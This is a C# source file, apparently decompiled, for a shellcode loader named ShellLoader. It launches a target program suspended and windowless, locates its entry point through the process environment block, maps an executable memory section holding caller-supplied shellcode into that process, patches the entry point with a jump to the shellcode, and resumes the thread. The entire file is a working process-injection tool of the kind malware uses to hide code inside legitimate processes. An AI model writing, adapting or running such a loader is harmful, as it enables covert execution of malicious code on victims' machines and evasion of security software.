using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;

namespace ShellLoader
{
    public sealed class Loader
    {
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;

            public IntPtr hThread;

            public int dwProcessId;

            public int dwThreadId;
        }

        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;

            public IntPtr PebAddress;

            public IntPtr Reserved2;

            public IntPtr Reserved3;

            public IntPtr UniquePid;

            public IntPtr MoreReserved;
        }

        internal struct STARTUPINFO
        {
            private uint cb;

            private IntPtr lpReserved;

            private IntPtr lpDesktop;

            private IntPtr lpTitle;

            private uint dwX;

            private uint dwY;

            private uint dwXSize;

            private uint dwYSize;

            private uint dwXCountChars;

            private uint dwYCountChars;

            private uint dwFillAttributes;

            private uint dwFlags;

            private ushort wShowWindow;

            private ushort cbReserved;

            private IntPtr lpReserved2;

            private IntPtr hStdInput;

            private IntPtr hStdOutput;

            private IntPtr hStdErr;
        }

        public struct SYSTEM_INFO
        {
            public uint dwOem;

            public uint dwPageSize;

            public IntPtr lpMinAppAddress;

            public IntPtr lpMaxAppAddress;

            public IntPtr dwActiveProcMask;

            public uint dwNumProcs;

            public uint dwProcType;

            public uint dwAllocGranularity;

            public ushort wProcLevel;

            public ushort wProcRevision;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        public struct LARGE_INTEGER
        {
            public uint LowPart;

            public int HighPart;
        }

        public const uint PageReadWriteExecute = 64u;

        public const uint PageReadWrite = 4u;

        public const uint PageExecuteRead = 32u;

        public const uint MemCommit = 4096u;

        public const uint SecCommit = 134217728u;

        public const uint GenericAll = 268435456u;

        public const uint CreateSuspended = 4u;

        public const uint DetachedProcess = 8u;

        public const uint CreateNoWindow = 134217728u;

        private IntPtr section_;

        private IntPtr localmap_;

        private IntPtr remotemap_;

        private IntPtr localsize_;

        private IntPtr remotesize_;

        private IntPtr pModBase_;

        private IntPtr pEntry_;

        private uint rvaEntryOffset_;

        private uint size_;

        private byte[] inner_;

        private const int AttributeSize = 24;

        private const ulong PatchSize = 16uL;

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwCreateSection(ref IntPtr section, uint desiredAccess, IntPtr pAttrs, ref Loader.LARGE_INTEGER pMaxSize, uint pageProt, uint allocationAttribs, IntPtr hFile);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwMapViewOfSection(IntPtr section, IntPtr process, ref IntPtr baseAddr, IntPtr zeroBits, IntPtr commitSize, IntPtr stuff, ref IntPtr viewSize, int inheritDispo, uint alloctype, uint prot);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void GetSystemInfo(ref Loader.SYSTEM_INFO lpSysInfo);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr GetCurrentProcess();

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern void CloseHandle(IntPtr handle);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwUnmapViewOfSection(IntPtr hSection, IntPtr address);

        [DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Auto, SetLastError = true)]
        private static extern bool CreateProcess(IntPtr lpApplicationName, string lpCommandLine, IntPtr lpProcAttribs, IntPtr lpThreadAttribs, bool bInheritHandles, uint dwCreateFlags, IntPtr lpEnvironment, IntPtr lpCurrentDir, [In] ref Loader.STARTUPINFO lpStartinfo, out Loader.PROCESS_INFORMATION lpProcInformation);

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress, IntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess, int procInformationClass, ref Loader.PROCESS_BASIC_INFORMATION procInformation, uint ProcInfoLen, ref uint retlen);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, IntPtr lpBuffer, IntPtr nSize, out IntPtr lpNumWritten);

        [DllImport("kernel32.dll")]
        private static extern uint GetLastError();

        public uint round_to_page(uint size)
        {
            Loader.SYSTEM_INFO info = default(Loader.SYSTEM_INFO);
            Loader.GetSystemInfo(ref info);
            return info.dwPageSize - size % info.dwPageSize + size;
        }

        private bool nt_success(long v)
        {
            return v >= 0L;
        }

        public IntPtr GetCurrent()
        {
            return Loader.GetCurrentProcess();
        }

        public KeyValuePair<IntPtr, IntPtr> MapSection(IntPtr procHandle, uint protect, IntPtr addr)
        {
            IntPtr baseAddr = addr;
            IntPtr viewSize = (IntPtr)((long)((ulong)this.size_));
            int status = Loader.ZwMapViewOfSection(this.section_, procHandle, ref baseAddr, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref viewSize, 1, 0u, protect);
            bool flag = !this.nt_success((long)status);
            if (flag)
            {
                throw new SystemException("[x] Something went wrong! " + status.ToString());
            }
            return new KeyValuePair<IntPtr, IntPtr>(baseAddr, viewSize);
        }

        public bool CreateSection(uint size)
        {
            Loader.LARGE_INTEGER liVal = default(Loader.LARGE_INTEGER);
            this.size_ = this.round_to_page(size);
            liVal.LowPart = this.size_;
            int status = Loader.ZwCreateSection(ref this.section_, 268435456u, (IntPtr)0, ref liVal, 64u, 134217728u, (IntPtr)0);
            return this.nt_success((long)status);
        }

        public void SetLocalSection(uint size)
        {
            KeyValuePair<IntPtr, IntPtr> vals = this.MapSection(this.GetCurrent(), 64u, IntPtr.Zero);
            bool flag = vals.Key == (IntPtr)0;
            if (flag)
            {
                throw new SystemException("[x] Failed to map view of section!");
            }
            this.localmap_ = vals.Key;
            this.localsize_ = vals.Value;
        }

        public unsafe void CopyShellcode(byte[] buf)
        {
            uint lsize = this.size_;
            bool flag = (long)buf.Length > (long)((ulong)lsize);
            if (flag)
            {
                throw new IndexOutOfRangeException("[x] Shellcode buffer is too long!");
            }
            byte* p = (byte*)((void*)this.localmap_);
            for (int i = 0; i < buf.Length; i++)
            {
                p[i] = buf[i];
            }
        }

        public Loader.PROCESS_INFORMATION StartProcess(string path)
        {
            Loader.STARTUPINFO startInfo = default(Loader.STARTUPINFO);
            Loader.PROCESS_INFORMATION procInfo = default(Loader.PROCESS_INFORMATION);
            uint flags = 134217740u;
            bool flag = !Loader.CreateProcess((IntPtr)0, path, (IntPtr)0, (IntPtr)0, true, flags, (IntPtr)0, (IntPtr)0, ref startInfo, out procInfo);
            if (flag)
            {
                throw new SystemException("[x] Failed to create process!");
            }
            return procInfo;
        }

        public unsafe KeyValuePair<int, IntPtr> BuildEntryPatch(IntPtr dest)
        {
            int i = 0;
            IntPtr ptr = Marshal.AllocHGlobal((IntPtr)16L);
            byte* p = (byte*)((void*)ptr);
            bool flag = IntPtr.Size == 4;
            byte[] tmp;
            if (flag)
            {
                p[i] = 184;
                i++;
                int val = (int)dest;
                tmp = BitConverter.GetBytes(val);
            }
            else
            {
                p[i] = 72;
                i++;
                p[i] = 184;
                i++;
                long val2 = (long)dest;
                tmp = BitConverter.GetBytes(val2);
            }
            for (int j = 0; j < IntPtr.Size; j++)
            {
                p[i + j] = tmp[j];
            }
            i += IntPtr.Size;
            p[i] = 255;
            i++;
            p[i] = 224;
            i++;
            return new KeyValuePair<int, IntPtr>(i, ptr);
        }

        private unsafe IntPtr GetEntryFromBuffer(byte[] buf)
        {
            IntPtr res = IntPtr.Zero;
            fixed (byte[] array = buf)
            {
                byte* p;
                if (buf == null || array.Length == 0)
                {
                    p = null;
                }
                else
                {
                    p = &array[0];
                }
                uint e_lfanew_offset = *(uint*)(p + 60);
                byte* nthdr = p + e_lfanew_offset;
                byte* opthdr = nthdr + 24;
                ushort t = *(ushort*)opthdr;
                byte* entry_ptr = opthdr + 16;
                int tmp = *(int*)entry_ptr;
                this.rvaEntryOffset_ = (uint)tmp;
                bool flag = IntPtr.Size == 4;
                if (flag)
                {
                    res = (IntPtr)(this.pModBase_.ToInt32() + tmp);
                }
                else
                {
                    res = (IntPtr)(this.pModBase_.ToInt64() + (long)tmp);
                }
            }
            this.pEntry_ = res;
            return res;
        }

        public IntPtr FindEntry(IntPtr hProc)
        {
            Loader.PROCESS_BASIC_INFORMATION basicInfo = default(Loader.PROCESS_BASIC_INFORMATION);
            uint tmp = 0u;
            int success = Loader.ZwQueryInformationProcess(hProc, 0, ref basicInfo, (uint)(IntPtr.Size * 6), ref tmp);
            bool flag = !this.nt_success((long)success);
            if (flag)
            {
                throw new SystemException("[x] Failed to get process information!");
            }
            IntPtr readLoc = IntPtr.Zero;
            byte[] addrBuf = new byte[IntPtr.Size];
            bool flag2 = IntPtr.Size == 4;
            if (flag2)
            {
                readLoc = (IntPtr)((int)basicInfo.PebAddress + 8);
            }
            else
            {
                readLoc = (IntPtr)((long)basicInfo.PebAddress + 16L);
            }
            IntPtr nRead = IntPtr.Zero;
            bool flag3 = !Loader.ReadProcessMemory(hProc, readLoc, addrBuf, addrBuf.Length, out nRead) || nRead == IntPtr.Zero;
            if (flag3)
            {
                throw new SystemException("[x] Failed to read process memory!");
            }
            bool flag4 = IntPtr.Size == 4;
            if (flag4)
            {
                readLoc = (IntPtr)BitConverter.ToInt32(addrBuf, 0);
            }
            else
            {
                readLoc = (IntPtr)BitConverter.ToInt64(addrBuf, 0);
            }
            this.pModBase_ = readLoc;
            bool flag5 = !Loader.ReadProcessMemory(hProc, readLoc, this.inner_, this.inner_.Length, out nRead) || nRead == IntPtr.Zero;
            if (flag5)
            {
                throw new SystemException("[x] Failed to read module start!");
            }
            return this.GetEntryFromBuffer(this.inner_);
        }

        public void MapAndStart(Loader.PROCESS_INFORMATION pInfo)
        {
            KeyValuePair<IntPtr, IntPtr> tmp = this.MapSection(pInfo.hProcess, 64u, IntPtr.Zero);
            bool flag = tmp.Key == (IntPtr)0 || tmp.Value == (IntPtr)0;
            if (flag)
            {
                throw new SystemException("[x] Failed to map section into target process!");
            }
            this.remotemap_ = tmp.Key;
            this.remotesize_ = tmp.Value;
            KeyValuePair<int, IntPtr> patch = this.BuildEntryPatch(tmp.Key);
            try
            {
                IntPtr pSize = (IntPtr)patch.Key;
                IntPtr tPtr = 0;
                bool flag2 = !Loader.WriteProcessMemory(pInfo.hProcess, this.pEntry_, patch.Value, pSize, out tPtr) || tPtr == IntPtr.Zero;
                if (flag2)
                {
                    throw new SystemException("[x] Failed to write patch to start location! " + Loader.GetLastError().ToString());
                }
            }
            finally
            {
                bool flag3 = patch.Value != IntPtr.Zero;
                if (flag3)
                {
                    Marshal.FreeHGlobal(patch.Value);
                }
            }
            byte[] tbuf = new byte[4096];
            IntPtr nRead = 0;
            bool flag4 = !Loader.ReadProcessMemory(pInfo.hProcess, this.pEntry_, tbuf, 1024, out nRead);
            if (flag4)
            {
                throw new SystemException("Failed!");
            }
            uint res = Loader.ResumeThread(pInfo.hThread);
            bool flag5 = res == 4294967295u;
            if (flag5)
            {
                throw new SystemException("[x] Failed to restart thread!");
            }
        }

        public IntPtr GetBuffer()
        {
            return this.localmap_;
        }

        protected override void Finalize()
        {
            try
            {
                bool flag = this.localmap_ != (IntPtr)0;
                if (flag)
                {
                    Loader.ZwUnmapViewOfSection(this.section_, this.localmap_);
                }
            }
            finally
            {
                base.Finalize();
            }
        }

        public void Load(string targetProcess, byte[] shellcode)
        {
            Loader.PROCESS_INFORMATION pinf = this.StartProcess(targetProcess);
            this.FindEntry(pinf.hProcess);
            bool flag = !this.CreateSection((uint)shellcode.Length);
            if (flag)
            {
                throw new SystemException("[x] Failed to create new section!");
            }
            this.SetLocalSection((uint)shellcode.Length);
            this.CopyShellcode(shellcode);
            this.MapAndStart(pinf);
            Loader.CloseHandle(pinf.hThread);
            Loader.CloseHandle(pinf.hProcess);
        }

        public Loader()
        {
            this.section_ = 0;
            this.localmap_ = 0;
            this.remotemap_ = 0;
            this.localsize_ = 0;
            this.remotesize_ = 0;
            this.inner_ = new byte[4096];
        }
    }
}
